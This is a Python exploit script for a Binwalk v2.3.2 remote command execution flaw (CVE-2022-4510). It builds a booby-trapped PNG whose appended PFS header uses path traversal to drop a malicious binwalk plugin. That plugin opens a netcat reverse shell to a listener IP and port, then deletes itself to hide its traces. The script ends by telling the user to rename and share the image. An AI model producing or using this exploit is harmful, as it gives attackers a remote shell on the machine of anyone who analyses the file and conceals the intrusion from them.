# Obtain a random image and use it to generate a new image named binwalk_exploit.png.
# Follow these steps to use the script:
# 1. Run the script using Python 3: python3 binwalk_rce.py mouse.png 10.10.14.111 4444

# Replace 'mouse.png' with the path to your desired random image file.
# Replace '10.10.14.111' with the IP address of your listener.
# Replace '4444' with the port number of your listener.


import os
import argparse

def main():
    parser = argparse.ArgumentParser(description="Exploit for Binwalk v2.3.2 Remote Command Execution (CVE-2022-4510)")
    parser.add_argument("file", help="Path to input .png file")
    parser.add_argument("ip", help="IP address for reverse shell listener")
    parser.add_argument("port", type=int, help="Port for reverse shell listener")
    args = parser.parse_args()

    if args.file and args.ip and args.port:
        header_pfs = bytes.fromhex("5046532f302e390000000000000001002e2e2f2e2e2f2e2e2f2e636f6e6669672f62696e77616c6b2f706c7567696e732f62696e77616c6b2e70790000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034120000a0000000c100002e")
        lines = [
            'import binwalk.core.plugin\n',
            'import os\n',
            'import shutil\n',
            'class MaliciousExtractor(binwalk.core.plugin.Plugin):\n',
            '    def init(self):\n',
            f'        if not os.path.exists("/tmp/.binwalk"):\n',
            f'            os.system("nc {args.ip} {args.port} -e /bin/bash 2>/dev/null &")\n',
            '            with open("/tmp/.binwalk", "w") as f:\n',
            '                f.write("1")\n',
            '        else:\n',
            '            os.remove("/tmp/.binwalk")\n',
            '            os.remove(os.path.abspath(__file__))\n',
            '            shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), "__pycache__"))\n'
        ]

        with open(args.file, "rb") as in_file:
            data = in_file.read()

        with open("/tmp/plugin", "w") as f:
            f.writelines(lines)

        with open("/tmp/plugin", "rb") as f:
            content = f.read()

        os.remove("/tmp/plugin")

        with open("binwalk_exploit.png", "wb") as f:
            f.write(data)
            f.write(header_pfs)
            f.write(content)

        print("Exploit file 'binwalk_exploit.png' created.")
        print("Rename and share binwalk_exploit.png to start the exploit.")

if __name__ == "__main__":
    main()
